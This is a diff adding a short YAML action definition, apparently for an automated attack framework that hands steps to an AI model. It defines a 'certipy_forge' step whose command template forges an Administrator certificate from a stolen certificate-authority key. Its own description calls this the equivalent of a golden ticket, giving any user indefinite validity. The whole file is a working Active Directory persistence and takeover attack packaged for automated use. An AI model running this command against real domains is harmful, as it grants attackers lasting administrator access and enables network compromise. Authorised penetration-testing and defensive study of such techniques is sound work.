@@ -1,0 +1,16 @@
+name: certipy_forge
+category: ad
+description: Golden certificate forgery with stolen CA cert
+preconditions:
+  - domain_joined
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "certipy forge -ca-pfx '{ca_pfx}' -upn 'administrator@{domain}' -subject 'CN=Administrator'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Forges certificate using stolen CA private key. Equivalent to golden ticket — any user, indefinite validity."
